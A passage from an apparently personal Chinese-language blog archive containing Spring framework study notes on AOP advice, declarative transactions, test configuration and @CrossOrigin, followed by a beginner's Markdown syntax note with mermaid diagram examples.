<h4 id="步骤2：正常编写核心业务，加入IoC容器"><a href="#步骤2：正常编写核心业务，加入IoC容器" class="headerlink" title="步骤2：正常编写核心业务，加入IoC容器"></a>步骤2：正常编写核心业务，加入IoC容器</h4><p>接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fu.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fu.service.imp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fu.service.Calculator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalculatorPureImpl</span> <span class="keyword">implements</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i + j;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i - j;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i * j;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">div</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i / j;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="步骤3：编写IoC配置类和文件"><a href="#步骤3：编写IoC配置类和文件" class="headerlink" title="步骤3：编写IoC配置类和文件"></a>步骤3：编写IoC配置类和文件</h4><p>本次只使用配置类方式配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(value = &quot;com.fu.service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="步骤4：测试环境"><a href="#步骤4：测试环境" class="headerlink" title="步骤4：测试环境"></a>步骤4：测试环境</h4><p>当使用AOP（面向切面编程）时，实际被注入到其他bean中或者从Spring的IoC（Inversion of  Control，控制反转）容器中获取的对象，并不是定义的原始bean（即目标对象），而是一个由Spring创建的代理对象。这个代理对象包装了原始bean，并可以拦截对原始bean方法的调用，以便在这些方法调用前后执行额外的行为（如日志记录、事务管理等）。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fu.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fu.Config;</span><br><span class="line"><span class="keyword">import</span> com.fu.service.Calculator;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit.jupiter.SpringJUnitConfig;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringJUnitConfig(value = Config.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AOPTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Calculator calculator;</span><br><span class="line">    <span class="comment">// 放到IoC容器的不是目标对象，而是代理对象！</span></span><br><span class="line">    <span class="comment">// 因此这里</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testAOP</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(calculator.add(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>AOPTest</code> 类通过 <code>@Autowired</code> 注解自动注入了一个 <code>Calculator</code> 接口的实现。根据Spring AOP的工作原理，如果<code>Calculator</code>接口的实现类被配置了切面（AOP增强），那么Spring IoC容器中实际存放的将是一个代理对象，而不是直接是<code>Calculator</code>接口的具体实现类实例。</p>
<p>这意味着当调用 <code>calculator.add(1, 2)</code> 方法时，实际上首先会与代理对象进行交互。这个代理对象负责拦截对<code>add</code>方法的调用，并可以在执行实际的<code>add</code>方法之前或之后应用额外的行为（例如事务管理、日志记录等）。只有当这些额外的行为（如果有的话）被执行完毕后，代理对象才会将请求转发给真正的<code>Calculator</code>实现类来执行<code>add</code>方法。</p>
<p>当前<code>Calculator</code>接口有一个实现类<code>CalculatorPureImpl</code>，并且我们为<code>Calculator</code>定义了一些AOP切面来记录每次调用<code>add</code>方法的日志信息。在这种情况下，Spring会在运行时创建一个<code>CalculatorPureImpl</code>的代理对象，并将它作为<code>Calculator</code>类型的bean注册到IoC容器中。</p>
<p>因此，在<code>AOPTest</code>中的<code>testAOP</code>方法执行时：</p>
<ol>
<li>当尝试访问<code>calculator</code>成员变量时，实际上获取的是由Spring创建的代理对象。</li>
<li>调用<code>calculator.add(1, 2)</code>时，首先是由代理对象处理这个调用。</li>
<li>代理对象检查是否有任何适用于<code>add</code>方法的前置通知、环绕通知等，并相应地执行它们。</li>
<li>然后，代理对象调用<code>CalculatorPureImpl</code>的真实<code>add</code>方法。</li>
<li>最后，代理对象可以再执行任何后置通知或最终处理逻辑，如返回结果前的日志记录。</li>
<li><code>System.out.println(calculator.add(1,2));</code> 输出计算的结果。</li>
</ol>
<h4 id="步骤5：增强类，定义四个增强方法（存储横切关注点的代码）"><a href="#步骤5：增强类，定义四个增强方法（存储横切关注点的代码）" class="headerlink" title="步骤5：增强类，定义四个增强方法（存储横切关注点的代码）"></a>步骤5：增强类，定义四个增强方法（存储横切关注点的代码）</h4><p>假设对于方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> i + j;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们想要创建一个日志，在代码中显示方法的执行过程，添加代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function start&quot;</span>);		<span class="comment">// 附加功能代码，在核心代码执行前执行</span></span><br><span class="line">         result = i + j; 							<span class="comment">// 原有核心代码</span></span><br><span class="line">        System.out.println(<span class="string">&quot;function success&quot;</span>);		<span class="comment">// 附加功能代码，在核心代码成功结束后执行</span></span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function error&quot;</span>);		<span class="comment">// 附加功能代码，在核心代码异常结束后执行</span></span><br><span class="line">    &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function finish&quot;</span>);		<span class="comment">// 附加功能代码，在核心代码结束最后执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>附加功能代码在核心代码的几个位置代表需要创建几个通知方法</strong></p>
<p>根据附加功能代码的位置，可以判断出需要定义四个<code>增强方法/通知方法</code>，分别是：</p>
<ul>
<li>前置通知：在被代理的目标方法<code>前</code>执行</li>
<li>返回通知：在被代理的目标方法<code>成功结束</code>后执行（寿终正寝）</li>
<li>异常通知：在被代理的目标方法<code>异常结束</code>后执行（死于非命）</li>
<li>后置通知：在被代理的目标方法<code>最终结束</code>后执行（盖棺定论）无论成功还是异常结束</li>
</ul>
<p>或者使用环绕通知：</p>
<ul>
<li>环绕通知：使用try…catch…finally结构围绕整个被代理的目标方法，包括上面四种通知对应的所有位置</li>
</ul>
<p>因此创建通知类&#x2F;增强类，并根据增强方法的类型添加对应的注解.</p>
<h4 id="步骤6：增强类的配置（插入切点的位置，切点指定，切面配置等）"><a href="#步骤6：增强类的配置（插入切点的位置，切点指定，切面配置等）" class="headerlink" title="步骤6：增强类的配置（插入切点的位置，切点指定，切面配置等）"></a>步骤6：增强类的配置（插入切点的位置，切点指定，切面配置等）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogAOP</span> &#123;</span><br><span class="line">    <span class="meta">@Before(value = &quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function start&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AfterReturning(value =&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">success</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AfterThrowing(value =&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@After(value =&quot;execution(* com.fu.service.imp.*.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finish</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;function finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="步骤7：开启AOP的配置"><a href="#步骤7：开启AOP的配置" class="headerlink" title="步骤7：开启AOP的配置"></a>步骤7：开启AOP的配置</h4><p>如果使用XML配置文件:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果使用配置类：在类声明前添加注解<code>@EnableAspectJAutoProxy</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableAspectJAutoProxy</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="声明式事务配置实践"><a href="#声明式事务配置实践" class="headerlink" title="声明式事务配置实践"></a>声明式事务配置实践</h2><h3 id="实践5：基于注解方式配置生成式事务"><a href="#实践5：基于注解方式配置生成式事务" class="headerlink" title="实践5：基于注解方式配置生成式事务"></a>实践5：基于注解方式配置生成式事务</h3><h4 id="步骤1：导入依赖"><a href="#步骤1：导入依赖" class="headerlink" title="步骤1：导入依赖"></a>步骤1：导入依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤2：将对应事务管理器实现导入IoC容器，开启事务注解支持"><a href="#步骤2：将对应事务管理器实现导入IoC容器，开启事务注解支持" class="headerlink" title="步骤2：将对应事务管理器实现导入IoC容器，开启事务注解支持"></a>步骤2：将对应事务管理器实现导入IoC容器，开启事务注解支持</h4><p>实践中使用JdbcTemplate，因此使用DataSourceTM</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 加入TransactionManager事务管理器实现</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> TransactionManager <span class="title function_">transactionManager</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line">    <span class="type">DataSourceTransactionManager</span> <span class="variable">dataSourceTransactionManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceTransactionManager</span>();</span><br><span class="line">    dataSourceTransactionManager.setDataSource(dataSource);</span><br><span class="line">    <span class="keyword">return</span> dataSourceTransactionManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开启事务注解支持，在上述组件声明所在的类添加注解<code>@EnableTransactionManagement</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2. 开启事务注解的支持</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaConfig</span> &#123;</span><br></pre></td></tr></table></figure>



<h4 id="步骤3：在需要添加事务的方法中使用注解-Transactional指明"><a href="#步骤3：在需要添加事务的方法中使用注解-Transactional指明" class="headerlink" title="步骤3：在需要添加事务的方法中使用注解@Transactional指明"></a>步骤3：在需要添加事务的方法中使用注解@Transactional指明</h4><p>注解<code>@Transactional</code>可以<strong>添加到类或方法</strong>上，表明此类下所有方法或此方法需要添加事务。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">changeInfo</span><span class="params">()</span> &#123;</span><br><span class="line">    studentDao.updateAgeById(<span class="number">100</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">    System.out.println(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">    studentDao.updateNameById(<span class="string">&quot;test1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>笔记主要内容：</p>
<table>
<thead>
<tr>
<th>核心点</th>
<th>掌握目标</th>
</tr>
</thead>
<tbody><tr>
<td>spring框架理解</td>
<td>spring家族和spring framework框架</td>
</tr>
<tr>
<td>spring核心功能</td>
<td>ioc&#x2F;di , aop , tx</td>
</tr>
<tr>
<td>spring ioc &#x2F; di</td>
<td>组件管理、ioc容器、ioc&#x2F;di , 三种配置方式</td>
</tr>
<tr>
<td>spring aop</td>
<td>aop和aop框架和代理技术、基于注解的aop配置</td>
</tr>
<tr>
<td>spring tx</td>
<td>声明式和编程式事务、动态事务管理器、事务注解、属性</td>
</tr>
</tbody></table>
<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h2 id="测试环境的搭建"><a href="#测试环境的搭建" class="headerlink" title="测试环境的搭建"></a>测试环境的搭建</h2><p>可以简化测试代码，在测试时无需使用代码创建IoC容器。</p>
<p>假如当前有组件类 StudentController，需要测试其功能，在<code>src/test/java</code>下创建了测试类，执行如下操作：</p>
<p><strong>步骤1：POM文件导入外部依赖</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>步骤2：如下设置测试类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定XML配置文件使用 locations</span></span><br><span class="line"><span class="comment">// @SpringJUnitConfig(locations = &quot;classpath:note.xml&quot;)</span></span><br><span class="line"><span class="comment">// 指定配置类使用 value</span></span><br><span class="line"><span class="comment">// 多个配置文件或配置类，使用&#123;&#125;并通过`,`分隔</span></span><br><span class="line"><span class="meta">@SpringJUnitConfig(value = CofigurationNote1.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNote1</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentController controller;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        controller.findAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>附加说明：</strong></p>
<ol>
<li>如果配置文件位于 <code>src/main/resources/config/</code> 目录下，应该这样写：<code>locations = &quot;classpath:note.xml&quot;</code></li>
<li>如果不提供 <code>locations</code> 或 <code>classes</code> 属性，Spring 将尝试查找与测试类同名的配置类（如果存在）</li>
<li><code>value</code>属性和<code>classes</code>属性通用，均可以省略。<code>locations</code>不可省略</li>
</ol>
<h2 id="后端跨域问题解决方案-CrossOrigin注解"><a href="#后端跨域问题解决方案-CrossOrigin注解" class="headerlink" title="后端跨域问题解决方案 - @CrossOrigin注解"></a>后端跨域问题解决方案 - @CrossOrigin注解</h2><p><code>@CrossOrigin</code> 注解是Spring框架提供的一个便捷工具，用于解决跨域资源共享（CORS）问题。它允许你灵活地配置哪些源可以访问你的资源。</p>
<ul>
<li><p><strong>功能</strong>：</p>
<ul>
<li>该注解能够指定允许访问的源（通过<code>origins</code>属性），支持的方法类型（通过<code>methods</code>属性），以及是否允许凭据（通过<code>allowCredentials</code>属性）等。</li>
<li>可以应用于类级别或方法级别，分别影响整个控制器或单个请求处理方法。</li>
</ul>
</li>
<li><p><strong>使用方法</strong>：</p>
<ul>
<li><strong>类级别</strong>：在控制器类上添加<code>@CrossOrigin</code>，为所有映射方法设置相同的CORS策略。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CrossOrigin(origins = &quot;http://example.com&quot;, maxAge = 3600)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>方法级别</strong>：直接在特定的请求处理方法上添加，覆盖类级别的设置。<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CrossOrigin(maxAge = 3600)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/greet&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">greeting</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;Hello, World&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>这种注解方式简化了CORS配置，使得开发人员可以快速实现对跨域请求的支持，而无需手动配置复杂的过滤器或编写额外的代码来处理HTTP头信息。</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>L-Markdown-Note</title>
    <url>/2024/05/03/L-Markdown-Note/</url>
    <content><![CDATA[<p>Markdown语法</p>
<span id="more"></span>
<p>参考：<br><a href="https://markdown.com.cn/basic-syntax/">Markdown官方文档</a></p>
<p><strong>注意</strong></p>
<p>Maven的使用<br>每个符号后都需要一个空格<br>引用、列表后应当空一行在添加非引用、列表的内容,以提高兼容</p>
<hr>
<h2 id="转移字符"><a href="#转移字符" class="headerlink" title="转移字符"></a>转移字符</h2><p>显示原本用于格式化 Markdown 文档的字符，需要在字符前面添加反斜杠字符 \。<br>包括 \ ` * _ { } [ ] ( ) # + - . ! |<br>&amp;和&lt;在html中必须用<code>&amp;lt;</code> 和 <code>&amp;amp</code>替代，但markdown语法可以不用，在 Markdown 的块级元素和内联元素中， &lt; 和 &amp; 两个符号都会被自动转换成 HTML 实体</p>
<h2 id="标题（-）"><a href="#标题（-）" class="headerlink" title="标题（#）"></a>标题（#）</h2><p>最多可以添加6级标题 </p>
<blockquote>
<p>   #            一级标题<br>   ##          二级标题<br>   ###        三级标题<br>   ####      四级标题<br>   #####    五级标题<br>   ######  六级标题</p>
</blockquote>
<p>或使用html符号 <code>&lt;h1\~6&gt;; &lt;/h1\~6&gt;</code>;</p>
<h2 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h2><p>使用空白行将一行或多行文本进行分隔。 </p>
<p>或使用html符号 <code>&lt;p&gt; &lt;/p&gt;</code>;</p>
<h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>在一行的末尾添加两个或多个空格，然后按回车键,即可创建一个换行;<br>或使用html符号 <code>&lt;br&gt;</code> </p>
<h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><p>Markdown本身不支持空格，但可以使用html语法<br>格式：<br>    &ensp;：输入一个空格<br>    &nbsp;：输入一个空格<br>    &emsp;：输入两个空格</p>
<h2 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h2><p><strong>粗体：</strong><br>单词或短语的前后各添加两个星号 <code>**</code><br><strong>**强调**</strong><br>或使用html语法 <code>&lt;strong&gt; &lt;/strong&gt;</code></p>
<p><strong>斜体：</strong><br>单词或短语前后添加一个星号 <code>*</code><br><em>*斜体*</em><br>或使用html语法 <code>&lt;em&gt; &lt;/em&gt;</code></p>
<p><strong>斜粗体</strong><br>单词或短语前后添加三个星号 <code>***</code><br><em><strong>***斜粗体***</strong></em><br>或使用html语法 <code>&lt;em&gt; &lt;/em&gt;</code></p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><strong>单段</strong><br>要创建块引用，请在段落前添加一个 <code>&gt;</code> 符号。<br><strong>多段</strong><br>包含多个段落。为段落之间的空白行添加一个 &gt; 符号<br><strong>嵌套</strong><br>块引用可以嵌套。在要嵌套的段落前添加一个 &gt; 符号<br>块引用也可以包含其他Markdown格式元素</p>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p><strong>有序列表</strong><br>在每个列表项前添加数字并紧跟一个英文句点，数字不需要按数学顺序排列，Markdown会自动按原顺序排列：</p>
<ol>
<li>第一个</li>
<li></li>
</ol>
<p>或使用html语法 <code>&lt;ol&gt; &lt;li&gt;第一个 &lt;/li&gt;&lt;li&gt;第二个 &lt;/li&gt;  &lt;ol&gt;</code></p>
<p><strong>无序列表</strong></p>
<p>在每个列表项前面添加<code>破折号 (-)、星号 (*) 或加号 (+)</code>。缩进一个或多个列表项（一个列表项两个空格）可创建嵌套列表。建议同一级列表使用相同的符号</p>
<blockquote>
<ul>
<li>a     <ul>
<li>b       <ul>
<li>c</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p>或使用html语法 <code>&lt;ul&gt; &lt;li&gt;a &lt;/li&gt;&lt;li&gt;b &lt;/li&gt;&lt;/ul&gt;</code></p>
<p><strong>列表中嵌套其他元素</strong><br>要在保留列表连续性的同时在列表中添加另一种元素，请将该元素缩进四个空格或一个制表符  </p>
<ul>
<li>列表<blockquote>
<p>缩进后其他元素如引用块</p>
</blockquote>
</li>
<li>列表</li>
</ul>
<h2 id="图表"><a href="#图表" class="headerlink" title="图表"></a>图表</h2><p>使用mermaid语法，在代码块语言处选择mermaid</p>
<h3 id="1-流程图（Flowchart）"><a href="#1-流程图（Flowchart）" class="headerlink" title="1. 流程图（Flowchart）"></a>1. 流程图（Flowchart）</h3><figure class="highlight m"><table><tr><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    A[开始] --&gt; B[步骤<span class="number">1</span>];</span><br><span class="line">    B --&gt; C&#123;决策&#125;;</span><br><span class="line">    C --&gt;|是| D[步骤<span class="number">2</span>];</span><br><span class="line">    C --&gt;|否| E[结束];</span><br><span class="line">    D --&gt; F[步骤<span class="number">3</span>];</span><br><span class="line">    F --&gt; E;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    A[开始] --&gt; B[步骤1];</span><br><span class="line">    B --&gt; C&#123;决策&#125;;</span><br><span class="line">    C --&gt;|是| D[步骤2];</span><br><span class="line">    C --&gt;|否| E[结束];</span><br><span class="line">    D --&gt; F[步骤3];</span><br><span class="line">    F --&gt; E;</span><br></pre></td></tr></table></figure>



<h3 id="2-顺序图（Sequence-Diagram）"><a href="#2-顺序图（Sequence-Diagram）" class="headerlink" title="2. 顺序图（Sequence Diagram）"></a>2. 顺序图（Sequence Diagram）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">    participant Alice</span><br><span class="line">    participant Bob</span><br><span class="line">    Alice-&gt;&gt;John: Hello John, how are you?</span><br><span class="line">    loop Healthcheck</span><br><span class="line">        John-&gt;&gt;John: Fight against hypochondria</span><br><span class="line">    end</span><br><span class="line">    Note right of John: Rational thoughts &lt;br/&gt;prevail...</span><br><span class="line">    John--&gt;&gt;Alice: Great!</span><br><span class="line">    John-&gt;&gt;Bob: How about you?</span><br><span class="line">    Bob--&gt;&gt;John: Jolly good!</span><br></pre></td></tr></table></figure>

